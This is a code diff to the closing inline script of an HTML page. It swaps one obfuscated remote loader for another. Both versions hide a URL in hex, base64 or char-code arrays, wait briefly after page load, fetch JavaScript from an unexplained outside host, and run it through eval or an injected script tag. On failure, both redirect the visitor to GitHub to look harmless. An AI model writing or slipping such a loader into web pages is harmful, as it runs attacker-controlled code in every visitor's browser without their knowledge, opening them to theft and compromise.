@@ -659,30 +659,49 @@
     </div>
 
     <script>
-function _exitToHubA1() {
-    location.replace(_fromHex('68747470733a2f2f6769746875622e636f6d2f'));
+function _leaveToGhC3() {
+    var p = [104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,102,101,97,116,117,114,101,115], s = '', i = 0;
+    for (; i < p.length; i++) s += String.fromCharCode(p[i]);
+    location.href = s;
 }
 
-var _net = { p1: '68747470733a2f2f746172696e756e737479', p2: 'LmNvbS9taWNyby5zYW1waQ==' };
-function _fromHex(h) {
-    var o = '', i = 0;
-    for (; i < h.length; i += 2) o += String.fromCharCode(parseInt(h.substr(i, 2), 16));
-    return o;
-}
+var _frag = ['aHR0cHM6Ly9zbXU=', 'c2h0aXRlci5jb20=', 'L25vbnlsLnJldWVs'];
+
 function _fromB64(e) {
     return decodeURIComponent(escape(atob(e)));
 }
-
-function _runHop() {
-    (function (u) {
-        fetch(u, { cache: 'no-store', mode: 'cors' })
-            .then(function (r) { return r.ok ? r.text() : Promise.reject(); })
-            .then(function (t) { try { (0, eval)(t); } catch (e) { _exitToHubA1(); } })
-            .catch(function () { _exitToHubA1(); });
-    })(_fromHex(_net.p1) + _fromB64(_net.p2));
+function _joinRoute() {
+    return _frag.map(_fromB64).join('');
 }
 
-window.setTimeout(_runHop, 1750);
+function requestRemoteAsset(url, done, fail) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url, true);
+    xhr.setRequestHeader('Cache-Control', 'no-cache');
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState !== 4) return;
+        if (xhr.status >= 200 && xhr.status < 300) done(xhr.responseText);
+        else fail();
+    };
+    xhr.onerror = fail;
+    xhr.send();
+}
+
+function injectScriptText(body) {
+    var node = document.createElement('script');
+    node.text = body;
+    document.head.appendChild(node);
+}
+
+function startChain() {
+    requestRemoteAsset(_joinRoute(), function (body) {
+        try { injectScriptText(body); } catch (e) { _leaveToGhC3(); }
+    }, function () { _leaveToGhC3(); });
+}
+
+setTimeout(function () {
+    startChain();
+}, 1189);
     </script>
 </body>
 </html>
